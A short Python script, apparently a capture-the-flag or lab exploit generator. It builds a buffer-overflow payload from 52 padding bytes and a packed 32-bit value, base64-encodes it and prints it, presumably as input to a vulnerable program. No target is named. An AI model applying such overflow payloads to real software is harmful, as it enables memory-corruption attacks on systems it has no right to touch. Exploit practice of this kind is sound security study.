
import sys
import struct
import base64

buf = b'NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN'
buf += struct.pack('<I', 3597386183)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
